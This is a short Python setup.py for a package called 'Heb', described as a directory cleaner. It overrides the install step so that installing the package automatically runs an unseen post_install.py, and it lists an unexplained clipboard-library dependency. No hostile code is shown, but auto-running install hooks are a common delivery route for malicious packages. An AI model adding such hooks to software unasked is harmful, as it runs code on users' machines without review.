from setuptools import setup, find_packages
from setuptools.command.install import install
import subprocess

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        subprocess.check_call(['python', 'post_install.py'])

setup(
    name='Heb',
    version='5.4.0',
    packages=find_packages(),
    install_requires=['pyperclip'],
    description="Clean your Directory with just one command",
    cmdclass={
        'install': PostInstallCommand,
    },
)
